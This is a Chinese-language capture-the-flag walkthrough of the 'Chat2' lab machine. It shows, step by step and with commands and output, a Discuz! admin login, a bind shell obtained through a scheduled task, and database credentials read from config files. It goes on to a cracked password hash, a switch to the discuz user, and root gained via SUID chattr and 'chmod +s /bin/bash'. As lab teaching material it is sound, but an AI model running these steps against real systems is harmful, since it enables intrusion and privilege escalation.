@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# **一、信息收集**
+
+首先，在与目标网络相同的网段下，使用 `arp-scan` 工具对C段进行扫描，以发现内网中的存活主机。">
+<meta property="og:title" content="内部_Chat2">
+<meta property="og:description" content="# **一、信息收集**
+
+首先，在与目标网络相同的网段下，使用 `arp-scan` 工具对C段进行扫描，以发现内网中的存活主机。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Chat2.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_Chat2</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Chat2</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/225" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
+<p>首先，在与目标网络相同的网段下，使用 <code class="notranslate">arp-scan</code> 工具对C段进行扫描，以发现内网中的存活主机。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -l
+...
+192.168.205.153 08:00:27:44:e8:4a       (Unknown)
+...</pre></div>
+<p>发现目标主机IP为 <code class="notranslate">192.168.205.153</code>。接下来，使用 <code class="notranslate">nmap</code> 对该主机进行全端口扫描，以探测其开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nmap -p0-65535 192.168.205.153
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 10:02 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.153
+Host is up (0.00010s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:44:E8:4A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+...</pre></div>
+<p>扫描结果显示，目标主机开放了22端口（SSH服务）和80端口（HTTP服务）。</p>
+<h1><strong>二、漏洞利用</strong></h1>
+<h2><strong>1. Web信息泄露</strong></h2>
+<p>我们首先从80端口的Web服务入手。访问 <code class="notranslate">http://192.168.205.153</code>，发现是一个Discuz!论坛。在“在线会员”模块中，我们注意到了一个名为 <code class="notranslate">admin</code> 的管理员用户。此外，在默认版块中发现了一篇标题为“Let's Encrypt”的文章。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3f3853e768049052b4da8fec8ed0eee281b49d7ee8e628c1943230151a3aa1cc/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323633393237332e77656270"><img src="https://camo.githubusercontent.com/3f3853e768049052b4da8fec8ed0eee281b49d7ee8e628c1943230151a3aa1cc/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323633393237332e77656270" alt="image-20250820220528034" data-canonical-src="http://7r1UMPHK.github.io/image/20250821102639273.webp" style="max-width: 100%;"></a></p>
+<p>查看文章内容，发现是一段摩斯密码：</p>
+<pre class="notranslate"><code class="notranslate">.--. .- ... ... .-- --- .-. -.. .---- ..--- ...--
+</code></pre>
+<p>使用在线摩斯密码解码工具，得到解码结果：</p>
+<pre class="notranslate"><code class="notranslate">PASSWORD123
+</code></pre>
+<blockquote>
+<p><strong>注意</strong>：摩斯密码本身不区分字母大小写，因此在实际爆破或登录尝试时，需要考虑所有可能的大小写组合，如 <code class="notranslate">password123</code>, <code class="notranslate">Password123</code>, <code class="notranslate">PASSWORD123</code> 等。</p>
+</blockquote>
+<h2><strong>2. 获取Web后台权限</strong></h2>
+<p>我们当前只知道管理员用户名为 <code class="notranslate">admin</code>，但没有SSH的用户名，因此首先尝试登录Discuz!的Web后台。</p>
+<p>使用用户名 <code class="notranslate">admin</code> 和刚刚解码出的密码 <code class="notranslate">password123</code> 进行登录，成功进入论坛。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fb5eeee77e6ad6834399a82af7ef0b91cce69f423fa25974ac5894433c3fe31b/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323730353232352e77656270"><img src="https://camo.githubusercontent.com/fb5eeee77e6ad6834399a82af7ef0b91cce69f423fa25974ac5894433c3fe31b/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323730353232352e77656270" alt="image-20250820220813966" data-canonical-src="http://7r1UMPHK.github.io/image/20250821102705225.webp" style="max-width: 100%;"></a></p>
+<p>在用户界面中，我们找到了“管理中心”的入口，这正是我们感兴趣的地方。点击进入时，系统要求再次验证密码，我们输入 <code class="notranslate">password123</code> 后成功进入后台。</p>
+<h2><strong>3. 正向Shell</strong></h2>
+<p>在后台首页，我们注意到该Discuz! 的版本为 3.5 (20250205)，这是一个较新的版本。经过初步搜索，并未发现该版本存在已知的远程代码执行（RCE）漏洞。</p>
+<p>于是，我们开始探索后台的各项功能。在 <strong>工具 &gt; 计划任务</strong> 中，发现一个名为 <code class="notranslate">shell.php</code> 的自定义任务。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1cb8d3cf71de020b08381375841cea148cff3960e77b7f1f59b1ad8d0d38baf4/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323633373032322e77656270"><img src="https://camo.githubusercontent.com/1cb8d3cf71de020b08381375841cea148cff3960e77b7f1f59b1ad8d0d38baf4/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323633373032322e77656270" alt="image-20250820221119024" data-canonical-src="http://7r1UMPHK.github.io/image/20250821102637022.webp" style="max-width: 100%;"></a></p>
+<p>尝试编辑该任务，发现其执行的脚本 <code class="notranslate">shell.php</code> 是写死的，无法直接修改其内容。根据命名推测，这可能是一个预留的WebShell或者一个用于建立连接的脚本。我们无法修改脚本，但可以控制其执行时间。</p>
+<p>我们将执行周期的“每周”字段改为 <code class="notranslate">*</code> (代表每天)，并将“分钟”字段修改为当前时间的下一分钟（例如，当前是10:12，就设置为13）。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9383d278fd7ac8ae86233954c7b2c86095f9d6bd7fc09b1c33f33c83b02dc40d/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323633373138362e77656270"><img src="https://camo.githubusercontent.com/9383d278fd7ac8ae86233954c7b2c86095f9d6bd7fc09b1c33f33c83b02dc40d/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303832313130323633373138362e77656270" alt="image-20250820221256884" data-canonical-src="http://7r1UMPHK.github.io/image/20250821102637186.webp" style="max-width: 100%;"></a></p>
+<blockquote>
+<p><strong>知识点补充</strong>：这是一种利用计划任务获取Shell的常见手法。这里的 <code class="notranslate">shell.php</code> 极有可能是一个正向Shell脚本，它会在被访问或执行时，监听服务器的某个端口，等待攻击者连接。</p>
+</blockquote>
+<p>到达设定的时间点（xx:13）后，我们再次使用 <code class="notranslate">nmap</code> 扫描目标主机的端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nmap -p0-65535 192.168.205.153
+...
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+12345/tcp open  netbus
+...</pre></div>
+<p>扫描结果显示，目标主机多开放了一个 <code class="notranslate">12345</code> 端口。我们尝试使用 <code class="notranslate">netcat (nc)</code> 连接该端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nc 192.168.205.153 12345
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<p>成功连接，并且执行 <code class="notranslate">id</code> 命令后得到了回显。这是一个 <code class="notranslate">www-data</code> 用户权限的正向Shell。为了便于后续操作，我们使用以下命令将其升级为一个稳定的交互式Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash
+<span class="pl-c"><span class="pl-c">#</span> 按下 Ctrl+Z 将其挂起</span>
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+<span class="pl-c"><span class="pl-c">#</span> 按下回车</span>
+reset xterm
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 24 columns 80</pre></div>
+<h1><strong>三、横向移动</strong></h1>
+<h2><strong>1. 数据库凭据发现</strong></h2>
+<p>当前我们是 <code class="notranslate">www-data</code> 用户，权限较低。首先，我们在系统中进行信息收集，寻找可以横向移动到其他用户的线索。在 <code class="notranslate">/home</code> 目录下，发现了一个名为 <code class="notranslate">discuz</code> 的用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Chat2:/var/www/html$ <span class="pl-c1">cd</span> /home/
+www-data@Chat2:/home$ ls -la
+total 12
+drwxr-xr-x  3 root   root   4096 Aug  3 09:28 <span class="pl-c1">.</span>
+drwxr-xr-x 18 root   root   4096 Mar 18 20:37 ..
+drwxr-xr-x  2 discuz discuz 4096 Aug  3 09:46 discuz</pre></div>
+<p>由于这是一个CMS应用，数据库配置文件通常包含了高权限的数据库用户凭据。我们在网站根目录 <code class="notranslate">/var/www/html/config/</code> 下找到了配置文件 <code class="notranslate">config_global.php</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Chat2:/var/www/html/config$ cat config_global.php
+...
+<span class="pl-smi">$_config</span>[<span class="pl-s"><span class="pl-pds">'</span>db<span class="pl-pds">'</span></span>][1][<span class="pl-s"><span class="pl-pds">'</span>dbhost<span class="pl-pds">'</span></span>] = <span class="pl-s"><span class="pl-pds">'</span>127.0.0.1<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$_config</span>[<span class="pl-s"><span class="pl-pds">'</span>db<span class="pl-pds">'</span></span>][1][<span class="pl-s"><span class="pl-pds">'</span>dbuser<span class="pl-pds">'</span></span>] = <span class="pl-s"><span class="pl-pds">'</span>discuz_user<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+<span class="pl-smi">$_config</span>[<span class="pl-s"><span class="pl-pds">'</span>db<span class="pl-pds">'</span></span>][1][<span class="pl-s"><span class="pl-pds">'</span>dbpw<span class="pl-pds">'</span></span>] = <span class="pl-s"><span class="pl-pds">'</span>StrongPassword!123<span class="pl-pds">'</span></span><span class="pl-k">;</span>
+...</pre></div>
+<h2><strong>2. 数据库信息挖掘</strong></h2>
+<p>我们找到了数据库用户 <code class="notranslate">discuz_user</code> 和密码 <code class="notranslate">StrongPassword!123</code>。使用该凭据连接本地的MariaDB数据库。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Chat2:/var/www/html/config$ mysql -u discuz_user -p<span class="pl-s"><span class="pl-pds">'</span>StrongPassword!123<span class="pl-pds">'</span></span>
+...
+MariaDB [(none)]<span class="pl-k">&gt;</span> show databases<span class="pl-k">;</span>
++--------------------+
+<span class="pl-k">|</span> Database           <span class="pl-k">|</span>
++--------------------+
+<span class="pl-k">|</span> discuz_db          <span class="pl-k">|</span>
+<span class="pl-k">|</span> information_schema <span class="pl-k">|</span>
+<span class="pl-k">|</span> mysql              <span class="pl-k">|</span>
++--------------------+</pre></div>
+<p>在 <code class="notranslate">discuz_db</code> 数据库的 <code class="notranslate">maze_ucenter_members</code> 表中，我们只发现了之前登录Web后台的admin用户哈希，这对横向移动没有帮助。</p>
+<p>于是，我们将目光转向了 <code class="notranslate">mysql</code> 这个系统数据库，它存储了数据库的所有用户信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">MariaDB [discuz_db]<span class="pl-k">&gt;</span> use mysql<span class="pl-k">;</span>
+Database changed
+MariaDB [mysql]<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">user,</span> host, password from user<span class="pl-k">;</span>
+...</pre></div>
+<p>查询 <code class="notranslate">user</code> 表后，除了已知的 <code class="notranslate">discuz_user</code>，我们还发现了一个名为 <code class="notranslate">hackme</code> 的用户，其密码哈希为 <code class="notranslate">FAAFFE644E901CFAFAEC7562415E5FAEC243B8B2</code>。这是一个MySQL 4.1版本之前的旧格式哈希（<code class="notranslate">mysql_old_password</code>）。</p>
+<p>我们使用在线哈希破解网站（如 crackstation.net）对此哈希进行查询，成功破解出明文密码为 <code class="notranslate">root123</code>。</p>
+<h2><strong>3. 切换用户</strong></h2>
+<p>我们猜测 <code class="notranslate">hackme</code> 用户的密码可能与系统用户 <code class="notranslate">discuz</code> 的密码相同。尝试使用 <code class="notranslate">su</code> 命令切换到 <code class="notranslate">discuz</code> 用户，并输入密码 <code class="notranslate">root123</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Chat2:/var/www/html/config$ su discuz
+Password: root123
+discuz@Chat2:/home$ id
+uid=1000(discuz) gid=1000(discuz) groups=1000(discuz)</pre></div>
+<p>成功切换！我们已经从 <code class="notranslate">www-data</code> 用户横向移动到了 <code class="notranslate">discuz</code> 用户。</p>
+<h1><strong>四、权限提升</strong></h1>
+<h2><strong>1. SUID提权向量与文件属性</strong></h2>
+<p>登录 <code class="notranslate">discuz</code> 用户后，我们首先检查该用户拥有的 <code class="notranslate">sudo</code> 权限，同时开始寻找系统上其他的提权向量，例如查找具有SUID权限位的二进制文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 检查sudo权限</span>
+discuz@Chat2:<span class="pl-k">~</span>$ sudo -l
+...
+User discuz may run the following commands on Chat2:
+    (ALL) NOPASSWD: /home/discuz/chat
+
+<span class="pl-c"><span class="pl-c">#</span> 查找系统范围内的SUID文件</span>
+discuz@Chat2:<span class="pl-k">~</span>$ find / -perm -4000 -type f -exec ls -l {} <span class="pl-cce">\;</span> <span class="pl-k">2&gt;</span>/dev/null
+...
+-rwsr-sr-x 1 root root 14336 Jan  9  2020 /usr/bin/chattr
+...</pre></div>
+<p>我们得到了两条关键信息：</p>
+<ol>
+<li><code class="notranslate">discuz</code> 用户可以无密码以root权限执行其家目录下的 <code class="notranslate">chat</code> 程序。这是一个非常直接的提权路径。</li>
+<li><code class="notranslate">/usr/bin/chattr</code> 命令被设置了SUID位。</li>
+</ol>
+<blockquote>
+<p><strong>知识点补充</strong>：SUID（Set User ID）是一种特殊的权限位。当一个可执行文件设置了SUID位后，任何用户在执行它时，进程的有效用户ID（euid）都会变成文件所有者的ID。<code class="notranslate">chattr</code> 的所有者是root，因此我们现在可以以root权限来执行 <code class="notranslate">chattr</code> 命令。</p>
+</blockquote>
+<p>我们的主要攻击思路是替换 <code class="notranslate">/home/discuz/chat</code> 文件为一个恶意脚本，然后通过 <code class="notranslate">sudo</code> 执行它来提权。然而，当我们尝试重命名或删除该文件时，却遭到了拒绝。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">discuz@Chat2:<span class="pl-k">~</span>$ mv chat chat.bak
+mv: cannot move <span class="pl-s"><span class="pl-pds">'</span>chat<span class="pl-pds">'</span></span> to <span class="pl-s"><span class="pl-pds">'</span>chat.bak<span class="pl-pds">'</span></span>: Operation not permitted</pre></div>
+<p>这个现象很不寻常，因为我们作为 <code class="notranslate">discuz</code> 用户，对自己家目录下的文件应该有写权限。这通常意味着文件被设置了特殊的扩展属性。我们使用 <code class="notranslate">lsattr</code> 命令来验证猜想。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">discuz@Chat2:<span class="pl-k">~</span>$ lsattr /home/discuz/chat
+----i---------e---- /home/discuz/chat</pre></div>
+<blockquote>
+<p><strong>知识点补充</strong>：<code class="notranslate">lsattr</code> 命令用于查看文件的扩展属性。这里的 <code class="notranslate">i</code> 属性（immutable）意味着该文件被“锁定”，即便是root用户也无法修改、删除、重命名或创建链接。</p>
+</blockquote>
+<p>现在，两条线索完美地结合在了一起：<code class="notranslate">chat</code> 文件因为 <code class="notranslate">i</code> 属性而无法被修改，而我们恰好拥有一个带SUID的 <code class="notranslate">chattr</code> 命令，可以用它来移除这个 <code class="notranslate">i</code> 属性。</p>
+<h2><strong>2. 替换文件并提权</strong></h2>
+<p>提权思路已经清晰：</p>
+<ol>
+<li>利用带SUID的 <code class="notranslate">/usr/bin/chattr</code> 移除 <code class="notranslate">/home/discuz/chat</code> 的 <code class="notranslate">i</code> 属性。</li>
+<li>将 <code class="notranslate">/home/discuz/chat</code> 替换为我们自己的恶意脚本。</li>
+<li>通过 <code class="notranslate">sudo</code> 执行修改后的 <code class="notranslate">chat</code> 脚本，以root权限完成提权。</li>
+</ol>
+<p>我们构造的恶意脚本功能是为 <code class="notranslate">/bin/bash</code> 添加SUID权限位，这样我们就能随时通过 <code class="notranslate">bash -p</code> 获取一个root shell。</p>
+<p>执行以下命令：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 1. 利用SUID chattr移除 i 属性</span>
+discuz@Chat2:<span class="pl-k">~</span>$ /usr/bin/chattr -i /home/discuz/chat
+
+<span class="pl-c"><span class="pl-c">#</span> 2. 备份原文件并创建恶意脚本</span>
+discuz@Chat2:<span class="pl-k">~</span>$ mv chat chat.bak
+discuz@Chat2:<span class="pl-k">~</span>$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> chat
+discuz@Chat2:<span class="pl-k">~</span>$ chmod +x chat
+
+<span class="pl-c"><span class="pl-c">#</span> 3. 检查 /bin/bash 当前权限</span>
+discuz@Chat2:<span class="pl-k">~</span>$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+
+<span class="pl-c"><span class="pl-c">#</span> 4. 使用sudo执行我们的脚本</span>
+discuz@Chat2:<span class="pl-k">~</span>$ sudo /home/discuz/chat
+
+<span class="pl-c"><span class="pl-c">#</span> 5. 再次检查 /bin/bash 权限，确认SUID位已添加</span>
+discuz@Chat2:<span class="pl-k">~</span>$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash</pre></div>
+<p>可以看到 <code class="notranslate">/bin/bash</code> 已经拥有了 <code class="notranslate">rws</code> 权限，SUID位设置成功。</p>
+<h2><strong>3. 获取Root Shell</strong></h2>
+<p>最后，执行 <code class="notranslate">bash -p</code> 命令，利用SUID权限获得一个 euid 为 0 (root) 的shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">discuz@Chat2:<span class="pl-k">~</span>$ bash -p
+bash-5.0# id
+uid=1000(discuz) gid=1000(discuz) euid=0(root) egid=0(root) groups=0(root),1000(discuz)</pre></div>
+<blockquote>
+<p><strong>知识点补充</strong>：<code class="notranslate">bash -p</code> 中的 <code class="notranslate">-p</code> 参数告诉bash不要将有效用户ID（euid）重置为实际用户ID（uid）。如果一个可执行文件（如bash）设置了SUID位，普通用户执行它时，进程的euid会变成文件所有者（root）的ID。<code class="notranslate">-p</code> 参数保留了这个提权后的euid，从而让我们获得root权限的shell。</p>
+</blockquote>
+<h1><strong>五、夺取凭证</strong></h1>
+<p>成功获取root权限后，我们读取位于用户目录和root目录下的flag文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">bash-5.0# cat /home/discuz/user.txt /root/root.txt
+flag{user-41352be6a84e5910fdef6afec4e41617}
+flag{root-099177104a7291ba00f83ab188987c5d}</pre></div>
+<p>成功获取所有flag，渗透测试结束。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
